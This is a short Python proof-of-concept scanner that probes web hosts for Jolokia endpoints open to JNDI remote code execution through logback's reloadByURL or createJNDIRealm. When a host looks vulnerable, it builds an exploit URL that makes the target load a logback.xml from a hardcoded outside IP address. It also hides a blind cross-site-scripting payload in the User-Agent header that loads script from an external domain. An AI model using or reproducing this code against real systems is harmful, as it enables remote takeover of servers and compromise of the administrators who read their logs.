#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = carrypan

import requests
import urlparse
import urllib3

def poc(url):
    portlist = ['21','22','23','25','53','110','137','161','389','445','873','1090','1099','1433','1521','2049','2181','2222','2375','3306','3389','5432','5901','5984','6379','11211','27017']    
    if url.split(':')[1] in portlist:
        return False
    elif int(url.split(':')[1]) == 443:
        url = 'https://' + url.split(':')[0]
    elif int(url.split(':')[1]) == 8443:
        url = 'https://' + url
    else:
        url = 'http://' + url    
    url = url + '/jolokia/list'
    try:
        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
        requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
        r = requests.get(url, headers=header, timeout=10, verify=False, allow_redirects=False)
        if r.status_code == 200 and "ch.qos.logback.classic.jmx.JMXConfigurator" in r.content and 'reloadByURL' in r.content:
            url = url + '/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/129.226.149.69!/logback.xml'
            return '[jolokia logback jndi rce]\t' + url
        elif r.status_code == 200 and 'type=MBeanFactory' in r.content and 'createJNDIRealm' in r.content:
            return '[jolokia realm jndi rce]\t' + url
        else:
            return False
    except:
        return False